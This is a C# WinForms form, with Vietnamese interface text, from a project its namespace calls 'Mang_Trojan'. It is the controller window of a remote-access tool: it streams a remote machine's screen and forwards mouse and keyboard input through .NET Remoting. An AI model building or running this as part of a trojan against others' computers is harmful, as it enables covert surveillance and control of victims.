using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Runtime.Remoting.Channels.Http;
using System.Net;
using System.Runtime.Remoting.Messaging;
using System.Drawing.Imaging;
using System.Threading;
using RemoteObject;
namespace Mang_Trojan.form
{
    public partial class RemoteDesktop : Form
    {
        
        #region variables
        bool connected = false;
        int refreshRate = 1;
        private static MemoryStream ms;
        private static Image img;   
        RemoteObject.ScreenObject hostInstance;


        Point mouseXY = new Point();
        int imgFormat;
        #endregion

        public RemoteDesktop(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
           
        }
        #region Form Event
        private void RemoteDesktop_Load(object sender, EventArgs e)
        {
            this.Text = "Điều khiển màn hình " + hostInstance.GetComputerName();
            cmbCompression.SelectedIndex = 3;
            picCast.KeyDown += new KeyEventHandler(picCast_KeyDown);
            picCast.KeyUp += new KeyEventHandler(picCast_KeyUp);
        }

        private void tbRefreshRate_Scroll(object sender, EventArgs e)
        {
            refreshRate = tbRefreshRate.Value;
            castTimer.Interval = refreshRate;
            lblRefreshRate.Text = castTimer.Interval.ToString() + " ms";
        }

        private void cmbCompression_SelectedIndexChanged(object sender, EventArgs e)
        {
            imgFormat = cmbCompression.SelectedIndex;
        }

        private void chkMouse_CheckedChanged(object sender, EventArgs e)
        {
            chkMouse.BackColor = (chkMouse.Checked) ? Color.Orange : Color.White;
        }

        private void chkKeyboard_CheckedChanged(object sender, EventArgs e)
        {
            chkKeyboard.BackColor = (chkKeyboard.Checked) ? Color.Orange : Color.White;
            picCast.Focus();
        }

        private void picCast_Click(object sender, EventArgs e)
        {
            picCast.Focus();
        }

        private void picCast_MouseMove(object sender, MouseEventArgs e)
        {
            try
            {
                mouseXY = e.Location;

                if (connected)
                {
                    if (chkMouse.Checked)
                    {
                        hostInstance.SetMouseLocation(mouseXY);
                    }
                }
            }
            catch (Exception ex)
            {
                updateText(lblMessage, ex.Message);
            }
        }

        private void picCast_MouseDown(object sender, MouseEventArgs e)
        {
            if (chkMouse.Checked)
            {
                if (e.Button == MouseButtons.Left)
                {
                    hostInstance.Left_Click_Down();
                }
                if (e.Button == MouseButtons.Right)
                {
                    hostInstance.Right_Click_Down();
                }
            }
        }

        private void picCast_MouseUp(object sender, MouseEventArgs e)
        {
            if (chkMouse.Checked)
            {
                if (e.Button == MouseButtons.Left)
                {
                    hostInstance.Left_Click_Up();
                }
                if (e.Button == MouseButtons.Right)
                {
                    hostInstance.Right_Click_Up();
                }
            }
        }

        //Keyboard Events
        void picCast_KeyDown(object sender, KeyEventArgs e)
        {
            if (chkKeyboard.Checked)
            {
                byte[] keyPressed = BitConverter.GetBytes(e.KeyValue);
                updateText(lblInput, "Phím ấn xuống: " + e.KeyCode.ToString());
                hostInstance.keyboard_key_down(keyPressed[0]);
            }
        }

        void picCast_KeyUp(object sender, KeyEventArgs e)
        {
            if (chkKeyboard.Checked)
            {
                byte[] keyPressed = BitConverter.GetBytes(e.KeyValue);
                updateText(lblInput, "Phím ấn lên: " + e.KeyCode.ToString());
                hostInstance.keyboard_key_up(keyPressed[0]);
            }
        }
        private void interface_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
        {
            if (chkKeyboard.Checked)
            {
                byte[] keyPressed = BitConverter.GetBytes(e.KeyValue);
                updateText(lblInput, "Phím ấn: " + e.KeyCode.ToString());
                hostInstance.keyboard_key_down(keyPressed[0]);
                hostInstance.keyboard_key_up(keyPressed[0]);
            }
        }

        private void btnConnect_Click(object sender, EventArgs e)
        {
            if (connected == false) //Not Connected
            {
                Connect();
            }
            else
            {
                Disconnect();
            }
        }
        #endregion
     

       

        #region Methods
        private void Connect()
        {
            try
            {
                castTimer.Enabled = true;
                connected = true;
                btnConnect.ImageIndex = 1;
                btnConnect.Text = "Ngắt kết nối";
                updatePanel(pnlBottom, true);
               

            }
            catch (Exception exc)
            {
                updateText(lblMessage, exc.Message);
            }
        }

        private void Disconnect()
        {
            try
            {

                castTimer.Enabled = false;
                bgWorker1.CancelAsync();
                connected = false;
                btnConnect.ImageIndex = 0;
                btnConnect.Text = "Kết nối";
                updatePanel(pnlBottom, false);
            }
            catch (Exception exc)
            {
                updateText(lblMessage, exc.Message);
                MessageBox.Show(exc.Message);
            }
        }
        #endregion

        #region Timers and BackgroundWorkers

        private void castTimer_Tick(object sender, EventArgs e)
        {
            if (!bgWorker1.IsBusy)
            {
                bgWorker1.RunWorkerAsync();
            }
        }

        private void bgWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
         
            try
            {
                if (hostInstance != null)
                {
                    ms = hostInstance.CastScreen(imgFormat, true,cbRealMouse.Checked);
                    img = Image.FromStream(ms);
                    updatePictureBox(picCast, img);
                    updateText(lblMessage, "Màn hình cập nhật - " + DateTime.Now);

                }
            }
            catch (Exception exc)
            {
                if (bgWorker1.IsBusy)
                { bgWorker1.CancelAsync(); }
                updateText(lblMessage, exc.Message);
            }
        }

        #endregion

        #region Delegate Methods

        private delegate void cmbDelegate(ComboBox cmb, string value, bool add);
        private void updateComboBox(ComboBox cmb, string value, bool add)
        {
            if (cmb.InvokeRequired)
            { cmb.Invoke(new cmbDelegate(updateComboBox), new object[] { cmb, value, add }); }
            else
            {
                if (add)
                { cmb.Items.Add(value); }
                else
                { cmb.Items.Clear(); }
            }
        }

        private delegate void picDelegate(PictureBox pic, Image value);
        private void updatePictureBox(PictureBox pic, Image value)
        {
            if (pic.InvokeRequired)
            { pic.Invoke(new picDelegate(updatePictureBox), new object[] { pic, value }); }
            else
            {
                pic.BackgroundImage = value;
            }
        }

        private delegate void panelDelegate(Panel pnl, bool value);
        private void updatePanel(Panel pnl, bool value)
        {
            if (pnl.InvokeRequired)
            { pnl.Invoke(new panelDelegate(updatePanel), new object[] { pnl, value }); }
            else
            {
                pnl.Visible = value;
            }
        }

        private delegate void textDelegate(Control cntrl, string value);
        private void updateText(Control cntrl, string value)
        {
            if (cntrl.InvokeRequired)
            { cntrl.Invoke(new textDelegate(updateText), new object[] { cntrl, value }); }
            else
            {
                cntrl.Text = value;
            }
        }

        #endregion
    }
        

       

    }

